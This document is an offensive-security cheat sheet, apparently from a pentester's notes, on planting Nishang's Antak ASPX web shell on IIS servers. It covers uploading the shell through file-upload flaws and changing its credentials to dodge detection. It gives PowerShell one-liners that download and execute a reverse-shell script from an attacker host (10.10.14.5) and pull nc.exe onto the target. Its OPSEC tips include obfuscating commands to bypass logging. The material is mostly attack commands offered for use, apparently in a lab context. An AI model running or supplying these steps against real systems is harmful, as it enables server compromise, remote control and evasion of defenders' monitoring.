# Antak

**Tags:** `#antak` `#nishang` `#webshells` `#aspx` `#powershell`

PowerShell-based ASPX web shell included in the Nishang framework. Provides an interactive PowerShell environment through the browser — supports command execution, file upload/download, and script encoding. More capable than basic command shells because it runs native PowerShell.

**Source:** https://github.com/samratashok/nishang (Antak-WebShell/)
**Install:** Pre-installed at `/usr/share/nishang/Antak-WebShell/antak.aspx`

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx .
```

> [!note]
> Requires IIS with ASP.NET and PowerShell available on the target. Set credentials before uploading — line 14 sets the username/password for the web interface. Default is usually `Disclaimer`/`ForLabs`.

---

## Setup

```bash
# Copy to working directory
cp /usr/share/nishang/Antak-WebShell/antak.aspx .

# Edit credentials (line 14)
# Look for: if(String.Compare(Request.Form["pass"],"ForLabs", ...
# Change username and password to avoid default detection

# Quick sed edit
sed -i 's/Disclaimer/myuser/; s/ForLabs/mypassword/' antak.aspx
```

Upload via file upload vulnerability, web app file manager, or CMS plugin upload.

---

## Usage

Browse to the uploaded shell:
```
http://target/uploads/antak.aspx
```

Enter your credentials → get a PowerShell prompt in the browser.

**In the web shell interface:**
```powershell
# Whoami
whoami

# System info
systeminfo

# Network
ipconfig /all
netstat -ano

# List users
net user
net localgroup administrators

# Reverse shell from Antak back to Kali
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444

# Upload a file to target
# Use the Upload button in the web interface

# Download a file from target
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe', 'C:\Windows\Temp\nc.exe')
```

---

## Load Nishang Reverse Shell via Antak

```powershell
# Download and execute Invoke-PowerShellTcp (on Kali: serve with python3 -m http.server)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443
```

Kali listener:
```bash
nc -lvnp 443
```

---

## OPSEC

- ASPX shells on disk — detectable by file integrity monitoring and AV
- PowerShell execution may trigger AMSI, ScriptBlock logging, and PowerShell transcription
- Encoded commands help bypass basic logging: use `-EncodedCommand` or Invoke-Obfuscation
- Remove shell after use
- Default credentials are well-known — always change before deploying

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
